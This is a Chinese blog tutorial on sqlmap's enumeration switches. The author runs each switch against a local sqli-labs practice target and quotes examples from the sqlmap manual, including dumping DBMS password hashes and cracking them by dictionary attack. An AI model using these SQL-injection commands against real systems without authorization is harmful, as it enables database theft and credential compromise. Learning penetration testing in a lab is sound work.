<!DOCTYPE html>
<html>
  <!-- meta/link... -->
  



<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
  <!-- Global site tag (gtag.js) - Google Analytics -->


  <title>SQL-sqlmap的使用 | BEACON</title>

  

  <link rel="icon" type="image/svg+xml" href="/images/BEACON13.svg">
  <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
  <link href="https://cdn.bootcdn.net/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">

  
  
<link rel="stylesheet" href="/css/animate.min.css">

  
<link rel="stylesheet" href="/css/style.css">

  
  
    
<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">

  
  
    
<link rel="stylesheet" href="/js/shareJs/share.min.css">

  
  <style>
        @media (max-width: 992px) {
            #waifu {
                display: none;
            }
        }
    </style>
    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
    <link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
<meta name="generator" content="Hexo 5.4.0"></head>

  
  <!-- 依赖于jquery和vue -->
  <script src="/js/jquery3.5.1.js"></script>
  <script src="/js/vue2.6.11.js"></script>
  
  <body>
    <!-- 预加载动画 -->
    <!-- 页面预加载动画 -->

<div id='loader'>
  <link rel="stylesheet" href="/js/loaded/index.css" >
  <div class="loading-left-bg"></div>
  <div class="loading-right-bg"></div>
  <div class="spinner-box">
    <div class="configure-border-1">
      <div class="configure-core"></div>
    </div>
    <div class="configure-border-2">
      <div class="configure-core"></div>
    </div>
    <div class="loading-word">loading...</div>
  </div>
</div>

<script>
  var endLoading = function () {
  document.body.style.overflow = 'auto';
  document.getElementById('loader').classList.add("loading");
  }
  window.addEventListener('load',endLoading);
</script>

    
    <!-- 判断是否为暗黑风格 -->
    <!-- 判断是否为黑夜模式 -->
<script>
  let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');

  if (isDark) {
    $(document.body).addClass('darkModel');
  }
</script>

    <!-- 头部导航等 -->
    
<header class="header " id="navHeader"
  style="position: fixed;
  left: 0; top: 0; z-index: 10;width: 100%;"
>
  <div class="header-content">
    <div class="bars">
      <div id="appDrawer" class="sidebar-image">
  <i class="fa fa-bars" aria-hidden="true" @click="showDialogDrawer"></i>
  <transition name="fade">
    <div class="drawer-box_mask" v-cloak style="display: none;" v-show="visible" @click.self="cancelDialogDrawer">
    </div>
  </transition>
  <div class="drawer-box" :class="{'active': visible}">
    <div class="drawer-box-head bg-color">
      <img class="drawer-box-head_logo" src="/images/BEACON14.png" alt="logo">
      <h3 class="drawer-box-head_title">BEACON</h3>
      <h5 class="drawer-box-head_desc">于浩歌狂热之际中寒；于天上看见深渊。于一切眼中看见无所有；于无所希望中得救！</h5>
    </div>
    
    <div class="drawer-box-content">
      <ul class="drawer-box-content_menu">
        
          
            <li class="drawer-box-content_item" style="position: relative;">
              
                <a href="/" class="drawer-menu-item-link">
                  
                    <i class="fa fa-home" aria-hidden="true"></i>
                  
                  <span class="name">Home</span>
                </a>
              
            </li>
          
            <li class="drawer-box-content_item" style="position: relative;">
              
                <a href="/archives" class="drawer-menu-item-link">
                  
                    <i class="fa fa-archive" aria-hidden="true"></i>
                  
                  <span class="name">Archives</span>
                </a>
              
            </li>
          
            <li class="drawer-box-content_item" style="position: relative;">
              
                <a href="/tags" class="drawer-menu-item-link">
                  
                    <i class="fa fa-tags" aria-hidden="true"></i>
                  
                  <span class="name">Tags</span>
                </a>
              
            </li>
          
            <li class="drawer-box-content_item" style="position: relative;">
              
                <a href="/categories" class="drawer-menu-item-link">
                  
                    <i class="fa fa-bookmark" aria-hidden="true"></i>
                  
                  <span class="name">Categories</span>
                </a>
              
            </li>
          
        
        <li class="drawer-box-content_item">
          <a href="https://beacon-cai.github.io/">
            <i class="fa fa-github" aria-hidden="true"></i>
            <span>Github</span>
          </a>
        </li>
      </ul>
    </div>
  </div>
</div>

<script>
  var body = document.body || document.documentElement || window;
  var vm = new Vue({
    el: '#appDrawer',
    data: {
      visible: false,
      top: 0,
      openArr: [],
    },
    computed: {
    },
    mounted() {
    },
    methods: {
      isOpen(index) {
        if (this.openArr.includes(index)) {
          return true;
        } else {
          return false;
        }
      },
      openOrCloseMenu(curIndex) {
        const index = this.openArr.indexOf(curIndex);
        if (index !== -1) {
          this.openArr.splice(index, 1);
        } else {
          this.openArr.push(curIndex);
        }
      },
      showDialogDrawer() {
        this.visible = true;
        // 防止页面滚动，只能让弹框滚动
        this.top = $(document).scrollTop()
        body.style.cssText = 'width: 100%; height: 100%;overflow: hidden;';
      },
      cancelDialogDrawer() {
        this.visible = false;
        body.removeAttribute('style');
        $(document).scrollTop(this.top)
      }
    },
    created() {}
  })
</script>

    </div>
    <div class="blog-title" id="author-avatar">
      
        <div class="avatar">
          <img src="/images/BEACON14.png" alt="logo">
        </div>
      
      <a href="/" class="logo">BEACON</a>
    </div>
    <nav class="navbar">
      <ul class="menu">
        
          
            <li class="menu-item" style="position: relative;">
              
                <a href="/" class="menu-item-link">
                  
                    <i class="fa fa-home" aria-hidden="true"></i>
                  
                  <span class="name">Home</span>
                </a>
              
            </li>
          
            <li class="menu-item" style="position: relative;">
              
                <a href="/archives" class="menu-item-link">
                  
                    <i class="fa fa-archive" aria-hidden="true"></i>
                  
                  <span class="name">Archives</span>
                </a>
              
            </li>
          
            <li class="menu-item" style="position: relative;">
              
                <a href="/tags" class="menu-item-link">
                  
                    <i class="fa fa-tags" aria-hidden="true"></i>
                  
                  <span class="name">Tags</span>
                </a>
              
            </li>
          
            <li class="menu-item" style="position: relative;">
              
                <a href="/categories" class="menu-item-link">
                  
                    <i class="fa fa-bookmark" aria-hidden="true"></i>
                  
                  <span class="name">Categories</span>
                </a>
              
            </li>
          
        
      </ul>
      
      
        <div id="appSearch">
  <div class="search"  @click="showDialog()"><i class="fa fa-search" aria-hidden="true"></i></div>
  <transition name="fade">
    <div class="message-box_wrapper" style="display: none;" v-cloak v-show="dialogVisible" @click.self="cancelDialogVisible()">
      <div class="message-box animated bounceInDown">
        <!-- <div class="close" style="overflow: hidden;">
          <i class="fa fa-close" aria-hidden="true" style="float:right;" @click.self="cancelDialogVisible()"></i>
        </div> -->
        <h2>
          <span>
            <i class="fa fa-search" aria-hidden="true"></i>
            <span class="title">Search</span>
          </span>
          <i class="fa fa-close close" style="float:right;" aria-hidden="true" @click.self="cancelDialogVisible()"></i>
        </h2>
        <form class="site-search-form">
          <input type="text"
            placeholder="Please enter keywords"
            id="local-search-input" 
            @click="getSearchFile()"
            class="st-search-input"
            v-model="searchInput"
          />
        </form>
        <div class="result-wrapper">
          <div id="local-search-result" class="local-search-result-cls"></div>
        </div>
      </div>
    </div>
  </transition>
</div>
<script src="/js/local_search.js"></script>
<script>
  var body = document.body || document.documentElement || window;
  var vm = new Vue({
    el: '#appSearch',
    data: {
      dialogVisible: false,
      searchInput: '',
      top: 0,
    },
    computed: {
    },
    mounted() {
    },
    methods: {
      showDialog() {
        this.dialogVisible = true;
        // 防止页面滚动，只能让弹框滚动
        this.top = $(document).scrollTop()
        body.style.cssText = 'overflow: hidden;';
      },
      getSearchFile() {
        if (!this.searchInput) {
          getSearchFile("/search.xml");
        }
      },
      cancelDialogVisible() {
        this.dialogVisible = false;
        body.removeAttribute('style');
        $(document).scrollTop(this.top)
      },
    },
    created() {}
  })
</script>
<!-- 解决刷新页面闪烁问题，可以在元素上添加display: none, 或者用vue.extend方法，详情：https://blog.csdn.net/qq_31393401/article/details/81017912 -->
<!-- 下面是搜索基本写法 -->
<!-- <script type="text/javascript" id="local.search.active">
  var inputArea = document.querySelector("#local-search-input");
  inputArea.onclick   = function(){ getSearchFile(); this.onclick = null }
  inputArea.onkeydown = function(){ if(event.keyCode == 13) return false }
</script> -->

      

    </nav>
  </div>
  
  <a href="https://beacon-cai.github.io/" class="github-corner color-primary" aria-label="View source on GitHub"><svg width="60" height="60" viewBox="0 0 250 250" style="fill:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
  
    <div id="he-plugin-simple"></div>
    <script>
      WIDGET = {
        CONFIG: {
          "modules": "012",
          "background": 5,
          "tmpColor": "4A4A4A",
          "tmpSize": 16,
          "cityColor": "4A4A4A",
          "citySize": 16,
          "aqiSize": 16,
          "weatherIconSize": 24,
          "alertIconSize": 18,
          "padding": "10px 10px 10px 10px",
          "shadow": "1",
          "language": "auto",
          "borderRadius": 5,
          "fixed": "false",
          "vertical": "middle",
          "horizontal": "center",
          "key": "2784dd3fcb1e4f0f9a9b579bf69641f2"
        }
      }
    </script>
    <script src="https://widget.qweather.net/simple/static/js/he-simple-common.js?v=2.0"></script> 
    

    <!-- 当头部导航设置为背景透明的时候  -->
    
      <script src="/js/header/index.js"></script>
    
</header>

    <!-- 内容区域 -->
    <main class="main" style="margin-top: 0;">
      
 <!-- prismjs 代码高亮 -->
 


<div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -1;"></div>

<!-- 文章详情页顶部图片和标题 -->




<div class="post-detail-header lazyload" id="thumbnail_canvas" data-original="/medias/6.jpg" style="background-repeat: no-repeat; background-size: cover; 
  background-position: center center;position: relative;">
  <div class="post-detail-header-mask"></div>
  <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
  
  <div class="title-box">
    <span class="title">
      SQL-sqlmap的使用
    </span>
  </div>
  
  
    <script src="/js/bubble/bubble.js"></script>
  
</div>



<div class="row justify-position">
  <div class="main-content">
    <article class="post post-detail">
      
      <div class="post-meta">
        <i class="fa fa-clock-o" aria-hidden="true"></i>
        <span class="post-time">2021-05-02</span>
      </div>
      
      <div class="post-tags-categories">
        
        <div class="tags">
          <i class="iconfont icontag"></i>
          
            <a href="/tags/SQL/" class="">
              SQL
            </a>
          
            <a href="/tags/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/" class="">
              基础学习
            </a>
          
            <a href="/tags/sqlmap/" class="">
              sqlmap
            </a>
          
        </div>
        
        
        <div class="categories">
          <i class="iconfont iconbookmark1"></i>
          
            <a href="/categories/WEB/" class="">
              WEB
            </a>
          
        </div>
        
      </div>
      <div class="post-content">
        <h1 id="SQL-sqlmap的使用"><a href="#SQL-sqlmap的使用" class="headerlink" title="SQL-sqlmap的使用"></a>SQL-sqlmap的使用</h1><p><a class="link"   target="_blank" rel="noopener" href="https://sqlmap.campfire.ga/" >sqlmap用户手册中文版<i class="fas fa-external-link-alt"></i></a></p>
<h1 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h1><p>数据测试以本地自己搭建的sqli-labs靶场为例</p>
<h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><blockquote>
<p>以下选项可用于枚举后端 DBMS（Database Management System，数据库管理系统）信息、表结构和表中包含的数据。此外，你还可以运行自定义的SQL 语句。</p>
</blockquote>
<h3 id="获取全部数据"><a href="#获取全部数据" class="headerlink" title="获取全部数据"></a>获取全部数据</h3><blockquote>
<p>开关：<code>--all</code></p>
<p>当用户想要通过使用单个开关远程获取所有可访问数据信息，可以使用该开关。通常不建议这么做，因为它会产生大量的请求同时获取有用无用的数据。</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--all</span></span><br></pre></td></tr></table></figure>

<p>测试了一下，该开关产生许多有用无用的数据，平常使用除非万不得已应该尽量少使用这个</p>
<h3 id="标语（Banner）"><a href="#标语（Banner）" class="headerlink" title="标语（Banner）"></a>标语（Banner）</h3><blockquote>
<p>开关：<code>-b</code> 或 <code>--banner</code></p>
<p>大多数现代 DBMS 具有一个函数和/或一个环境变量，它会返回 DBMS 版本，并最终在其补丁级别详细介绍底层系统。通常这个函数是 <code>version()</code> ，环境变量是 <code>@@version</code>，这取决于目标 DBMS。</p>
<p>针对 Oracle 目标的示例：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py <span class="operator">-</span>u &quot;http://192.168.136.131/sqlmap/oracle/get_int.php?id=1&quot; <span class="operator">-</span>\<span class="operator">-</span>banner</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">[xx:xx:<span class="number">11</span>] [INFO] fetching banner</span><br><span class="line">web application technology: PHP <span class="number">5.2</span><span class="number">.6</span>, Apache <span class="number">2.2</span><span class="number">.9</span></span><br><span class="line">back<span class="operator">-</span><span class="keyword">end</span> DBMS: Oracle</span><br><span class="line">banner:    <span class="string">&#x27;Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - Prod&#x27;</span></span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--banner</span></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210502210351444.png"
                      alt="image-20210502210351444"
                ></p>
<h3 id="当前会话用户"><a href="#当前会话用户" class="headerlink" title="当前会话用户"></a>当前会话用户</h3><blockquote>
<p>开关：<code>--current-user</code></p>
<p>使用此开关，可以从 Web 应用程序中获取到当前正在执行相关数据库查询操作的 DBMS 用户。</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--current-user</span></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210502210520463.png"
                      alt="image-20210502210520463"
                ></p>
<h3 id="当前数据库"><a href="#当前数据库" class="headerlink" title="当前数据库"></a>当前数据库</h3><blockquote>
<p>开关：<code>--current-db</code></p>
<p>使用此开关可以获取 Web 应用程序连接到的 DBMS 数据库名称。</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--current-db</span></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210502210712654.png"
                      alt="image-20210502210712654"
                ></p>
<h3 id="服务器主机名"><a href="#服务器主机名" class="headerlink" title="服务器主机名"></a>服务器主机名</h3><blockquote>
<p>开关：<code>--hostname</code></p>
<p>使用此开关可以获取 DBMS 所在的主机名。</p>
<p>针对 MySQL 目标的示例：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py <span class="operator">-</span>u &quot;http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot; <span class="comment">--\hostname</span></span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">[xx:xx:<span class="number">04</span>] [INFO] fetching server hostname</span><br><span class="line">[xx:xx:<span class="number">04</span>] [INFO] retrieved: debian<span class="number">-5.0</span><span class="operator">-</span>i386</span><br><span class="line">hostname:    <span class="string">&#x27;debian-5.0-i386&#x27;</span></span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--hostname</span></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210502210855110.png"
                      alt="image-20210502210855110"
                ></p>
<h3 id="检测当前会话用户是否为数据库管理员"><a href="#检测当前会话用户是否为数据库管理员" class="headerlink" title="检测当前会话用户是否为数据库管理员"></a>检测当前会话用户是否为数据库管理员</h3><blockquote>
<p>开关：<code>--is-dba</code></p>
<p>可以检测当前 DBMS 会话用户是否为数据库管理员，也称为 DBA。如果是，sqlmap 将返回 <code>True</code>，否则返回 <code>False</code>。</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--is-dba</span></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210502211024399.png"
                      alt="image-20210502211024399"
                ></p>
<h3 id="列出-DBMS-所有用户"><a href="#列出-DBMS-所有用户" class="headerlink" title="列出 DBMS 所有用户"></a>列出 DBMS 所有用户</h3><blockquote>
<p>开关：<code>--users</code></p>
<p>如果当前会话用户对包含 DBMS 用户信息的系统表有读取权限，可以枚举用户列表。</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--users</span></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210502211210814.png"
                      alt="image-20210502211210814"
                ></p>
<h3 id="列出和破解-DBMS-用户的密码哈希"><a href="#列出和破解-DBMS-用户的密码哈希" class="headerlink" title="列出和破解 DBMS 用户的密码哈希"></a>列出和破解 DBMS 用户的密码哈希</h3><blockquote>
<p>开关：<code>--passwords</code></p>
<p>如果当前会话用户对包含 DBMS 用户密码信息的系统表有读取权限，则可以枚举每个 DBMS 用户的密码哈希值。sqlmap 将会枚举所有用户，及一一对应的用户密码哈希。</p>
<p>针对 PostgreSQL 目标的示例：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py <span class="operator">-</span>u &quot;http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1&quot; <span class="comment">--\passwords -v 1</span></span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">back<span class="operator">-</span><span class="keyword">end</span> DBMS: PostgreSQL</span><br><span class="line">[hh:mm:<span class="number">38</span>] [INFO] fetching database users password hashes</span><br><span class="line">do you want <span class="keyword">to</span> use dictionary attack <span class="keyword">on</span> retrieved password hashes? [Y<span class="operator">/</span>n<span class="operator">/</span>q] y</span><br><span class="line">[hh:mm:<span class="number">42</span>] [INFO] <span class="keyword">using</span> hash <span class="keyword">method</span>: <span class="string">&#x27;postgres_passwd&#x27;</span></span><br><span class="line">what<span class="string">&#x27;s the dictionary&#x27;</span>s location? [<span class="operator">/</span>software<span class="operator">/</span>sqlmap<span class="operator">/</span>txt<span class="operator">/</span>wordlist.txt]</span><br><span class="line">[hh:mm:<span class="number">46</span>] [INFO] loading dictionary <span class="keyword">from</span>: <span class="string">&#x27;/software/sqlmap/txt/wordlist.txt&#x27;</span></span><br><span class="line">do you want <span class="keyword">to</span> use common password suffixes? (slow<span class="operator">!</span>) [y<span class="operator">/</span>N] n</span><br><span class="line">[hh:mm:<span class="number">48</span>] [INFO] starting dictionary attack (postgres_passwd)</span><br><span class="line">[hh:mm:<span class="number">49</span>] [INFO] found: <span class="string">&#x27;testpass&#x27;</span> <span class="keyword">for</span> <span class="keyword">user</span>: <span class="string">&#x27;testuser&#x27;</span></span><br><span class="line">[hh:mm:<span class="number">50</span>] [INFO] found: <span class="string">&#x27;testpass&#x27;</span> <span class="keyword">for</span> <span class="keyword">user</span>: <span class="string">&#x27;postgres&#x27;</span></span><br><span class="line">database management <span class="keyword">system</span> users password hashes:</span><br><span class="line">[<span class="operator">*</span>] postgres [<span class="number">1</span>]:    </span><br><span class="line">	password hash: md5d7d880f96044b72d0bba108ace96d1e4    </span><br><span class="line">	clear<span class="operator">-</span>text password: testpass</span><br><span class="line">[<span class="operator">*</span>] testuser [<span class="number">1</span>]:    </span><br><span class="line">	password hash: md599e5ea7a6f7c3269995cba3927fd0093   </span><br><span class="line">	clear<span class="operator">-</span>text password: testpass</span><br></pre></td></tr></table></figure>

<p>以上例子中，sqlmap 不仅枚举了 DBMS 用户及其密码，而且识别出密码哈希格式属于PostgreSQL，并询问用户是否使用字典文件进行散列测试，并识别出了用户 <code>postgres</code> 的明文密码，它通常是 DBA，被识别出的还有用户 <code>testuser</code> 的密码。</p>
<p>对于可以枚举用户密码哈希的 DBMS 都已实现了此功能，包括 Oracle 和 Microsoft SQL Server 2005 及后续版本。</p>
<p>你还可以使用 <code>-U</code> 选项来指定要枚举的特定用户，并破解其对应密码哈希。如果你提供 <code>CU</code> 作为用户名，它会将其视为当前用户的别名，并将获取此用户的密码哈希值。</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--passwords</span></span><br><span class="line"></span><br><span class="line">do you want <span class="keyword">to</span> store hashes <span class="keyword">to</span> a temporary file <span class="keyword">for</span> eventual further processing <span class="keyword">with</span> other tools [y<span class="operator">/</span>N] y</span><br><span class="line">do you want <span class="keyword">to</span> perform a dictionary<span class="operator">-</span>based attack against retrieved password hashes? [Y<span class="operator">/</span>n<span class="operator">/</span>q] n</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210502212257704.png"
                      alt="image-20210502212257704"
                ></p>
<p>使用<code>-U</code>来指定用户，便只输出指定用户</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="operator">-</span>U BEACON <span class="comment">--passwords</span></span><br><span class="line"></span><br><span class="line">do you want <span class="keyword">to</span> store hashes <span class="keyword">to</span> a temporary file <span class="keyword">for</span> eventual further processing <span class="keyword">with</span> other tools [y<span class="operator">/</span>N] y</span><br><span class="line">do you want <span class="keyword">to</span> perform a dictionary<span class="operator">-</span>based attack against retrieved password hashes? [Y<span class="operator">/</span>n<span class="operator">/</span>q] n</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210502212601561.png"
                      alt="image-20210502212601561"
                ></p>
<h3 id="列出-DBMS-所有用户权限"><a href="#列出-DBMS-所有用户权限" class="headerlink" title="列出 DBMS 所有用户权限"></a>列出 DBMS 所有用户权限</h3><blockquote>
<p>开关：<code>--privileges</code></p>
<p>如果当前会话用户对包含 DBMS 用户信息的系统表有读取权限，则可以枚举出每个 DBMS 用户的权限。根据权限信息，sqlmap 还将显示出哪些是数据库管理员。</p>
<p>你还可以使用 <code>-U</code> 选项来指定要枚举出权限的用户。</p>
<p>如果你提供 <code>CU</code> 作为用户名，它会将其视为当前用户的别名，并将获取此用户的权限信息。</p>
<p>在 Microsoft SQL Server 中，此功能将显示每个用户是否为数据库管理员，而不是所有用户的权限列表。</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--privileges</span></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210502213100773.png"
                      alt="image-20210502213100773"
                ></p>
<h3 id="列出-DBMS-所有用户角色"><a href="#列出-DBMS-所有用户角色" class="headerlink" title="列出 DBMS 所有用户角色"></a>列出 DBMS 所有用户角色</h3><blockquote>
<p>开关：<code>--roles</code></p>
<p>如果当前会话用户对包含 DBMS 用户信息的系统表有读取权限，则可以枚举出每个 DBMS 用户的角色。</p>
<p>你还可以使用 <code>-U</code> 选项来指定要枚举出角色的用户。</p>
<p>如果你提供 <code>CU</code> 作为用户名，它会将其视为当前用户的别名，并将获取此用户的角色信息。</p>
<p>此功能仅在 DBMS 为 Oracle 时可用。</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--roles</span></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210502213234254.png"
                      alt="image-20210502213234254"
                ></p>
<h3 id="列出-DBMS-所有数据库"><a href="#列出-DBMS-所有数据库" class="headerlink" title="列出 DBMS 所有数据库"></a>列出 DBMS 所有数据库</h3><blockquote>
<p>开关：<code>--dbs</code></p>
<p>如果当前会话用户对包含 DBMS 可用数据库信息的系统表有读取权限，则可以枚举出当前数据库列表。</p>
</blockquote>
